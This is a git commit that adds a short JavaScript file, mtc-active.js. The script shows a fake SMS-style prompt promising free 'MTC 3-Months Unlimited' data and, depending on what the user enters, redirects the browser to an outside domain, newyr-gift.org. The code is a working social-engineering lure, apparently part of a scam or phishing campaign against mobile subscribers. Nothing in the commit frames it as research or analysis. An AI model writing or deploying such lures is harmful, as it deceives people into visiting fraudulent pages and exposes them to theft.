bc0d643f1497f124f3093fee6b75ff06c2e4f5d6
ukebeblog <esther001imoh@gmail.com>
2025-01-05 16:09:39 +0100

    Create mtc-active.js

---
+++ mtc-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE UNLIMITED DATA'
+password=prompt('SMS: Congratulations You are qualify for MTC 3-Months Unlimited Free Data, Kindly Press OK to Activate now   ','ACTIVATE UNLIMITED DATA');
+if (password != 'ACTIVATE UNLIMITED DATA') {
+location.href='https://newyr-gift.org/mtc-unlimited.html';
+}
